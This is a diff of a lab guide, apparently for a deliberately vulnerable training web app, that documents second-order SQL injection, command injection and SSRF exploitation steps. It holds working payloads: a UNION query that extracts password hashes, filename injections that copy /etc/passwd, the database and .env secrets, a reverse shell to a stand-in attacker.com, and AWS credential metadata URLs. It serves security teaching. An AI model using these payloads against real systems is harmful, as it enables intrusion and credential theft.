@@ -105,23 +105,39 @@ id, company_name, contact_name, email, phone, address, owner_id, created_at (8 c
 
 ## V04 — Second-Order SQL Injection
 
-**Location**: `app.py` → Registration stores username, then `GET /projects` uses it unsafely  
+**Location**: `app.py` → Profile update stores display_name; `GET /projects` uses it unsafely
 **Vulnerable flow**:
 
-1. Register a new account with username (display_name): `test' UNION SELECT 1,2,3,4,5--`
-   - This is stored safely via parameterized query in the users table.
-2. Log in as that user and navigate to `/projects`
-3. The projects page runs:
+1. Any user (including a newly registered account) updates their display_name via the profile page with a SQL injection payload. The update uses a **parameterized query** — the payload is stored safely as a literal string in the database.
+2. The user navigates to `/projects`.
+3. The projects page retrieves the user's `display_name` from the database and directly interpolates it into a second SQL query (no parameterization this time):
    ```python
-   query = f"SELECT * FROM projects WHERE assigned_to = '{current_user.display_name}'"
+   display_name = user['display_name']
+   query = f"SELECT p.*, c.company_name FROM projects p JOIN clients c ... WHERE p.assigned_to = '{display_name}' OR p.status = 'active'"
    ```
    The stored payload is now injected into this second query.
 
-**Exploitation**:
-- Register with display_name: `' UNION SELECT id,email,password_hash,role,created_at FROM users--`
-- Log in, navigate to `/projects` → page renders extracted user data in the project list
+**Step 1 — Set up the payload**:
+- Go to `/profile`, update display_name to:
+  ```
+  x' UNION SELECT 1,email,password_hash,role,'none','none',0,0,'','',1,'' FROM users--
+  ```
+  (13 columns to match the JOIN'd SELECT from projects + clients)
+- Save the profile.
 
-**Why it's realistic**: Developer sanitized input on write but not on read, a classic second-order injection pattern.
+**Step 2 — Trigger the injection**:
+- Navigate to `/projects`
+- The projects list now contains rows of user data mixed with project data
+- The email and password_hash values will appear in the project name/description fields
+
+**Simpler detection payload** (check for injection without needing exact column count):
+- Set display_name to: `x' OR '1'='1`
+- Navigate to `/projects` → ALL projects appear (ignoring the assigned_to filter)
+
+**Column count note**: The query selects `p.*` (12 cols) + `c.company_name` (1 col) = 13 columns total.
+Use `ORDER BY 13--` to confirm, then UNION with 13 columns.
+
+**Why it's realistic**: Developer used parameterized queries at the write stage (correctly), but forgot to parameterize at the read stage. The dangerous value comes from their own database — hence "second-order".
 
 ---
 
@@ -274,37 +290,45 @@ Find `<class 'subprocess.Popen'>` index, then:
 
 ## V10 — Command Injection: Report Export
 
-**Location**: `app.py` → `POST /reports/export`  
-**Vulnerable code**:
+**Location**: `app.py` → `POST /reports/export`
+**Vulnerable code** (simplified view):
 ```python
-@app.route('/reports/export', methods=['POST'])
-def export_report():
-    report_type = request.form.get('type')
-    filename = request.form.get('filename', 'report')
-    # Generate report file
-    os.system(f"python3 scripts/generate_report.py --type={report_type} --out=/tmp/reports/{filename}.pdf")
-    return send_file(f"/tmp/reports/{filename}.pdf")
+filename = request.form.get('filename', 'report')
+output_path = f"/tmp/meridian_reports/{filename}.csv"
+
+# filename is unquoted in the shell command — ; injection works
+cmd = f"cd /app && python3 -c '...' > {output_path}"
+os.system(cmd)
 ```
 
-**Exploitation**:
+**The injection point**: `filename` is appended directly to `output_path` which appears unquoted at the end of the shell pipeline. A semicolon in the filename terminates the current command and starts a new one.
 
-**Basic test** (detect injection via filename):
-- filename: `report; sleep 5`  → if response is delayed by ~5s, injection confirmed
+**Step 1 — Confirm injection** (time-based):
+- filename: `report; sleep 5` → response is delayed by ~5 seconds → injection confirmed
 
-**Read sensitive files**:
-- filename: `x; cat /etc/passwd > /tmp/reports/out.pdf`  
-- Then download `/tmp/reports/out.pdf`
+**Step 2 — Prove RCE** (write a canary file):
+- filename: `report; touch /tmp/meridian_pwned`
+- Note: the app appends `.csv` to the entire output_path, so the canary file becomes `/tmp/meridian_pwned.csv`
+- Check: `ls /tmp/meridian_pwned.csv` → if it exists, RCE confirmed
 
-**Reverse shell**:
-- filename: `x; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'`
+**Step 3 — Read sensitive files**:
+- filename: `report; cp /etc/passwd /tmp/meridian_reports/passwd.csv`
+- Then use filename `passwd.csv` in a second normal request → downloads `/etc/passwd`
 
-**Read app source / database**:
-- filename: `x; cp /home/user/vuln-app/meridian.db /tmp/reports/db.pdf`
-- Download `db.pdf` → rename to `.db` → open with SQLite browser
+**Step 4 — Read app database**:
+- filename: `report; cp /home/user/vuln-app/meridian.db /tmp/meridian_reports/db.csv`
+- Download `db.csv` → rename to `meridian.db` → open with any SQLite browser
+
+**Step 5 — Read app config / secrets**:
+- filename: `report; cp /home/user/vuln-app/.env /tmp/meridian_reports/env.csv`
+
+**Step 6 — Reverse shell**:
+- filename: `report; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'`
+- Set up listener: `nc -lvnp 4444` before sending the request
 
 **Impact**: Full server compromise, arbitrary code execution.
 
-**Why it's realistic**: Dev used `os.system()` with a shell command for convenience, passing user input for the filename. Very common in "quick" reporting features.
+**Why it's realistic**: Dev used `os.system()` with an unquoted user-supplied value in a shell pipeline — an extremely common mistake in "quick" reporting or export features.
 
 ---
 
@@ -398,9 +422,10 @@ def test_webhook():
 - `http://169.254.169.254/latest/meta-data/` → AWS instance metadata
 - `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → AWS IAM creds
 
-**Step 4 — File read via file:// protocol**:
+**Step 4 — File read via file:// protocol** (urllib supports this):
 - `file:///etc/passwd`
 - `file:///home/user/vuln-app/.env`
+- `file:///home/user/vuln-app/meridian.db` (binary, but readable)
 
 **Step 5 — Internal admin panels**:
 - `http://127.0.0.1:8080/admin` → if other services running
